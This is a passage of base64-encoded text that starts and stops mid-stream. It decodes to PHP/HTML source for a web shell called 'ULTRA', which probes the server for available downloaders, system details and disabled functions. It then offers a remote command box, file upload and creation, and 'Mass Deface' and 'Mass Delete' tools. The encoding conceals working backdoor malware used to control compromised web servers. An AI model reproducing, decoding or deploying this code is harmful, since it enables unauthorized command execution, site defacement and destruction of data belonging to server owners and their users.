gICAgICAgICAgICAkZG93bmxvYWRlcnMgPSBbJ3dnZXQnLCAnZmV0Y2gnLCAnbHlueCcsICdsaW5rcycsICdjdXJsJywgJ2dldCcsICdsd3AtbWlycm9yJ107DQogICAgICAgICAgICAkeCA9IDA7DQogICAgICAgICAgICBmb3JlYWNoICgkZG93bmxvYWRlcnMgYXMgJGkpIHsNCiAgICAgICAgICAgICAgICBpZiAod2hpY2goJGkpKSB7DQogICAgICAgICAgICAgICAgICAgICR4Kys7DQogICAgICAgICAgICAgICAgICAgICRkb3dubG9hZGVyIC49ICRpIC4gJywgJzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJHggPT0gMCkgew0KICAgICAgICAgICAgICAgICRkb3dubG9hZGVyID0gJy0tLS0tLS0tJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR1c2VmdWwgPSAnLS0tLS0tLS0nOw0KICAgICAgICAgICAgJGRvd25sb2FkZXIgPSAnLS0tLS0tLS0nOw0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJHVzZWZ1bCA9ICctLS0tLS0tLSc7DQogICAgICAgICRkb3dubG9hZGVyID0gJy0tLS0tLS0tJzsNCiAgICB9DQp9DQoNCg0KJGlwID0gZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pOw0KJHVpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOw0KJHNlcnYgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107DQokc29mdCA9ICRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXTsNCiRjbWRfdW5hbWUgPSBjbWQoInVuYW1lIC1hIik7DQokdW5hbWUgPSBmdW5jdGlvbl9leGlzdHMoJ3BocF91bmFtZScpID8gc3Vic3RyKEBwaHBfdW5hbWUoKSwgMCwgMTIwKSA6IChzdHJsZW4oJGNtZF91bmFtZSkgPiAwID8gJGNtZF91bmFtZSA6ICdVbmFtZSBFcnJvciEnKTsNCiR0b3RhbCA9IGRpc2tfdG90YWxfc3BhY2UoJHBhdGgpOw0KJGZyZWUgPSBkaXNrX2ZyZWVfc3BhY2UoJHBhdGgpOw0KJHBlcnMgPSAoaW50KSgkZnJlZSAvICR0b3RhbCAqIDEwMCk7DQokZHMgPSBAaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKTsNCiRzaG93X2RzID0gKCFlbXB0eSgkZHMpKSA/ICI8Zm9udCBjbGFzcz0ndGV4dC1kYW5nZXInPiRkczwvZm9udD4iIDogIjxmb250IGNsYXNzPSd0ZXh0LXN1Y2Nlc3MnPkFsbCBmdW5jdGlvbiBpcyBhY2Nlc3NpYmxlPC9mb250PiI7DQoNCmlmIChAaW5pX2dldCgnb3Blbl9iYXNlZGlyJykpIHsNCiAgICAkYmFzZWRpcl9kYXRhID0gQGluaV9nZXQoJ29wZW5fYmFzZWRpcicpOw0KICAgIGlmIChzdHJsZW4oJGJhc2VkaXJfZGF0YSkgPiAxMjApIHsNCiAgICAgICAgJG9wZW5fYiA9ICI8Zm9udCBjbGFzcz0ndGV4dC1zdWNjZXNzJz4iIC4gc3Vic3RyKCRiYXNlZGlyX2RhdGEsIDAsIDEyMCkgLiAiLi4uPC9mb250PiI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgJG9wZW5fYiA9ICc8Zm9udCBjbGFzcz0idGV4dC1zdWNjZXNzIj4nIC4gJGJhc2VkaXJfZGF0YSAuICc8L2ZvbnQ+JzsNCiAgICB9DQp9IGVsc2Ugew0KICAgICRvcGVuX2IgPSAnPGZvbnQgY2xhc3M9InRleHQtd2FybmluZyI+Tk9ORTwvZm9udD4nOw0KfQ0KDQppZiAoIWZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKSB7DQogICAgJHVzZXIgPSBmdW5jdGlvbl9leGlzdHMoImdldF9jdXJyZW50X3VzZXIiKSA/IEBnZXRfY3VycmVudF91c2VyKCkgOiAiPz8/PyI7DQogICAgJHVpZCA9IGZ1bmN0aW9uX2V4aXN0cygiZ2V0bXl1aWQiKSA/IEBnZXRteXVpZCgpIDogIj8/Pz8iOw0KICAgICRnaWQgPSBmdW5jdGlvbl9leGlzdHMoImdldG15Z2lkIikgPyBAZ2V0bXlnaWQoKSA6ICI/Pz8/IjsNCiAgICAkZ3JvdXAgPSAiPyI7DQp9IGVsc2Ugew0KICAgICR1aWQgPSBmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldHB3dWlkIikgJiYgZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRldWlkIikgPyBAcG9zaXhfZ2V0cHd1aWQocG9zaXhfZ2V0ZXVpZCgpKSA6IFsibmFtZSIgPT4gIj8/Pz8iLCAidWlkIiA9PiAiPz8/PyJdOw0KICAgICRnaWQgPSBmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGdyZ2lkIikgJiYgZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRlZ2lkIikgPyBAcG9zaXhfZ2V0Z3JnaWQocG9zaXhfZ2V0ZWdpZCgpKSA6IFsibmFtZSIgPT4gIj8/Pz8iLCAiZ2lkIiA9PiAiPz8/PyJdOw0KICAgICR1c2VyID0gJHVpZFsnbmFtZSddOw0KICAgICR1aWQgPSAkdWlkWyd1aWQnXTsNCiAgICAkZ3JvdXAgPSAkZ2lkWyduYW1lJ107DQogICAgJGdpZCA9ICRnaWRbJ2dpZCddOw0KfQ0KDQokZGlycyA9IHNjYW5kaXIoJHBhdGgpOw0KDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4NCiAgICA8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9Im5vaW5kZXgsIG5vZm9sbG93Ij4NCiAgICA8bGluayBocmVmPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2Nzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ig0KICAgICAgICAgIGludGVncml0eT0ic2hhMzg0LTFCbUU0a1dCcTc4aVloRmxkdkt1aGZUQVU2YXVVOHRUOTRXckhmdGpEYnJDRVhTVTFvQm9xeWwyUXZaNmpJVzMiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPg0KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9wcm8uZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjEwLjAvY3NzL2FsbC5jc3MiDQogICAgICAgICAgaW50ZWdyaXR5PSJzaGEzODQtQVltRUMzWXc1Y1ZiM1pjdUh0T0E5M3czNWRZVHN2aExQVm5ZczllU3RIZkdKdk92S3hWZkVMR3JvR2t2c2crcCIgY3Jvc3NvcmlnaW49ImFub255bW91cyIvPg0KICAgIDx0aXRsZT5VTFRSQSBbIDw/PSAkc2VydjsgPz4gXTwvdGl0bGU+DQogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1VYnVudHUrTW9ubyIgcmVsPSJzdHlsZXNoZWV0Ij4NCiAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KICAgICAgICAqIHsNCiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBVYnVudHUgTW9ubzsNCiAgICAgICAgfQ0KDQogICAgICAgIGEgew0KICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KICAgICAgICAgICAgY29sb3I6IHdoaXRlOw0KICAgICAgICB9DQoNCiAgICAgICAgYTpob3ZlciB7DQogICAgICAgICAgICBjb2xvcjogd2hpdGU7DQogICAgICAgIH0NCg0KICAgICAgICAvKiB3aWR0aCAqLw0KICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyIHsNCiAgICAgICAgICAgIHdpZHRoOiA3cHg7DQogICAgICAgICAgICBoZWlnaHQ6IDdweDsNCiAgICAgICAgfQ0KDQogICAgICAgIC8qIEhhbmRsZSAqLw0KICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRodW1iIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IGdyZXk7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA3cHg7DQogICAgICAgIH0NCg0KICAgICAgICAvKiBUcmFjayAqLw0KICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsNCiAgICAgICAgICAgIGJveC1zaGFkb3c6IGluc2V0IDAgMCA3cHggZ3JleTsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDdweDsNCiAgICAgICAgfQ0KDQogICAgICAgIC50ZC1icmVhayB7DQogICAgICAgICAgICB3b3JkLWJyZWFrOiBicmVhay1hbGwNCiAgICAgICAgfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keSBjbGFzcz0iYmctZGFyayB0ZXh0LWxpZ2h0Ij4NCjxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+DQogICAgPGRpdiBjbGFzcz0icHktMyIgaWQ9Im1haW4iPg0KICAgICAgICA8ZGl2IGNsYXNzPSJwLTQgcm91bmRlZC0zIj4NCiAgICAgICAgICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVybGVzcyB0ZXh0LWxpZ2h0Ij4NCiAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgIDx0ZD48aSBjbGFzcz0iZmEgZmEtc2VydmVyIj48L2k+JmVuc3A7PD89ICR1bmFtZTsgPz48L3RkPg0KICAgICAgICAgICAgICAgIDwvdHI+DQoNCiAgICAgICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgICAgIDx0ZD48aSBjbGFzcz0iZmEgZmEtbWljcm9jaGlwIj48L2k+JmVuc3A7PD89ICRzb2Z0OyA/PjwvdGQ+DQogICAgICAgICAgICAgICAgPC90cj4NCg0KICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgPHRkPjxpIGNsYXNzPSJmYSBmYS1zYXRlbGxpdGUtZGlzaCI+PC9pPiZlbnNwOzw/PSAkaXA7ID8+JmVuc3A7fCZlbnNwO1lvdXIgSVA6IDw/PSAkdWlwOyA/PjwvdGQ+DQogICAgICAgICAgICAgICAgPC90cj4NCg0KICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgPHRkPjxpIGNsYXNzPSJmYSBmYS1maW5nZXJwcmludCI+PC9pPiZlbnNwOzw/PSAkZG9tOyA/PjwvdGQ+DQogICAgICAgICAgICAgICAgPC90cj4NCg0KICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgPHRkPjxpIGNsYXNzPSJmYXMgZmEtY29nIj48L2k+Jm5ic3A7WyZuYnNwOzw/cGhwIGVjaG8gd3JpdGFibGUoJHBhdGgsIHBlcm1zKCRwYXRoKSkgPz4mbmJzcDtdPC90ZD4NCiAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgPHRkPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhIGZhLWZvbGRlciBwdC0xIj48L2k+JmVuc3A7DQogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBmb3JlYWNoICgkZXhkaXIgYXMgJGlkID0+ICRwYXQpIDogaWYgKCRwYXQgPT0gJycgJiYgJGlkID09IDApOiA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ij9kaXI9LyIgY2xhc3M9InRleHQtZGVjb3JhdGlvbi1ub25lIHRleHQtbGlnaHQiPi88L2E+DQogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHBhdCA9PSAnJykgY29udGludWU7ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iP2Rpcj08P3BocCBmb3IgKCRpID0gMDsgJGkgPD0gJGlkOyAkaSsrKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIiRleGRpclskaV0iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGkgIT0gJGlkKSBlY2hvICIvIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9ID8+IiBjbGFzcz0idGV4dC1kZWNvcmF0aW9uLW5vbmUgdGV4dC1saWdodCI+PD89ICRwYXQgPz48L2E+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQtbGlnaHQiPiAvPC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kZm9yZWFjaDsgPz4NCiAgICAgICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgPC90YWJsZT4NCiAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGNsYXNzPSJyb3cgZy0yIHAtMiI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWF1dG8iPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCBmb3JtLWNvbnRyb2wtc20iIG5hbWU9ImJkY21kIiBwbGFjZWhvbGRlcj0id2hvYW1pIj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtYXV0byI+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zbSI+U3VibWl0PC9idXR0b24+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgICAgICA8ZGl2IGlkPSJ0b29sIj4NCiAgICAgICAgICAgICAgICA8Y2VudGVyPg0KICAgICAgICAgICAgICAgICAgICA8aHIgd2lkdGg9JzIwJSc+DQogICAgICAgICAgICAgICAgPC9jZW50ZXI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZC1mbGV4IGp1c3RpZnktY29udGVudC1jZW50ZXIgZmxleC13cmFwIG15LTMiPg0KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSI/IiBjbGFzcz0ibS0xIGJ0biBidG4tb3V0bGluZS1saWdodCBidG4tc20iPjxpIGNsYXNzPSJmYSBmYS1ob21lIj48L2k+IEhvbWU8L2E+DQogICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJtLTEgYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zbSIgZGF0YS1icy10b2dnbGU9ImNvbGxhcHNlIiBocmVmPSIjdXBsb2FkIiByb2xlPSJidXR0b24iDQogICAgICAgICAgICAgICAgICAgICAgIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIiBhcmlhLWNvbnRyb2xzPSJjb2xsYXBzZUV4YW1wbGUiPjxpIGNsYXNzPSJmYSBmYS11cGxvYWQiPjwvaT4gVXBsb2FkPC9hPg0KICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibS0xIGJ0biBidG4tb3V0bGluZS1saWdodCBidG4tc20iIGRhdGEtYnMtdG9nZ2xlPSJjb2xsYXBzZSIgaHJlZj0iI21hc3NEZWYiIHJvbGU9ImJ1dHRvbiINCiAgICAgICAgICAgICAgICAgICAgICAgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtY29udHJvbHM9ImNvbGxhcHNlRXhhbXBsZSI+PGkgY2xhc3M9ImZhIGZhLWxheWVyLWdyb3VwIj48L2k+IE1hc3MNCiAgICAgICAgICAgICAgICAgICAgICAgIERlZmFjZTwvYT4NCiAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im0tMSBidG4gYnRuLW91dGxpbmUtbGlnaHQgYnRuLXNtIiBkYXRhLWJzLXRvZ2dsZT0iY29sbGFwc2UiIGhyZWY9IiNtYXNzRGVsIiByb2xlPSJidXR0b24iDQogICAgICAgICAgICAgICAgICAgICAgIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIiBhcmlhLWNvbnRyb2xzPSJjb2xsYXBzZUV4YW1wbGUiPjxpIGNsYXNzPSJmYSBmYS1lcmFzZXIiPjwvaT4gTWFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgRGVsZXRlPC9hPg0KICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibS0xIGJ0biBidG4tb3V0bGluZS1saWdodCBidG4tc20iIGRhdGEtYnMtdG9nZ2xlPSJjb2xsYXBzZSIgaHJlZj0iI2luZm8iIHJvbGU9ImJ1dHRvbiINCiAgICAgICAgICAgICAgICAgICAgICAgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtY29udHJvbHM9ImNvbGxhcHNlRXhhbXBsZSI+PGkgY2xhc3M9ImZhIGZhLWluZm8tY2lyY2xlIj48L2k+IEluZm8NCiAgICAgICAgICAgICAgICAgICAgICAgIFNlcnZlcjwvYT4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8Y2VudGVyPg0KICAgICAgICAgICAgICAgICAgICA8aHIgd2lkdGg9JzIwJSc+DQogICAgICAgICAgICAgICAgPC9jZW50ZXI+DQoNCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSIgaWQ9InVwbG9hZCIgZGF0YS1icy1wYXJlbnQ9IiN0b29sIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGp1c3RpZnktY29udGVudC1jZW50ZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iZm9ybS1sYWJlbCI+RmlsZSBVcGxvYWRlcjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImZpbGUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIG5hbWU9InVwbG9hZGZpbGVbXSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ9ImlucHV0R3JvdXBGaWxlMDQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyaWEtZGVzY3JpYmVkYnk9ImlucHV0R3JvdXBGaWxlQWRkb24wNCIgYXJpYS1sYWJlbD0iVXBsb2FkIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtdWx0aXBsZT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQiIHR5cGU9InN1Ym1pdCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkPSJpbnB1dEdyb3VwRmlsZUFkZG9uMDQiPlVwbG9hZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSIgaWQ9Im5ld0ZpbGVDb2xsYXBzZSIgZGF0YS1icy1wYXJlbnQ9IiN0b29sIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGp1c3RpZnktY29udGVudC1jZW50ZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iZm9ybS1sYWJlbCI+RmlsZSBOYW1lPC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJuZXdGaWxlTmFtZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGFjZWhvbGRlcj0idGVzdC5waHAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImZvcm0tbGFiZWwiPkZpbGUgQ29udGVudDwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGV4dGFyZWEgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iNSIgbmFtZT0ibmV3RmlsZUNvbnRlbnQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxhY2Vob2xkZXI9IkhlbGxvLVdvcmxkIj48L3RleHRhcmVhPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQiPkNyZWF0ZTwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSIgaWQ9Im5ld0ZvbGRlckNvbGxhcHNlIiBkYXRhLWJzLXBhcmVudD0iI3Rvb2wiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cganVzdGlmeS1jb250ZW50LWNlbnRlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJmb3JtLWxhYmVsIj5Gb2xkZXIgTmFtZTwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgbmFtZT0ibmV3Rm9sZGVyTmFtZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGFjZWhvbGRlcj0iaG9tZSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1saWdodCI+Q3JlYXRlPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbGxhcHNlIiBpZD0ibWFzc0RlZiIgZGF0YS1icy1wYXJlbnQ9IiN0b29sIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGp1c3RpZnktY29udGVudC1jZW50ZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iZm9ybS1sYWJlbCI+RGlyZWN0b3J5PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJtYXNzRGVmRGlyIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlPSI8Pz0gJHBhdGggPz4iPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImZvcm0tbGFiZWwiPkZpbGUgTmFtZTwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgbmFtZT0ibWFzc0RlZk5hbWUiDQogICAgICAgICAgICAgICAgICAgI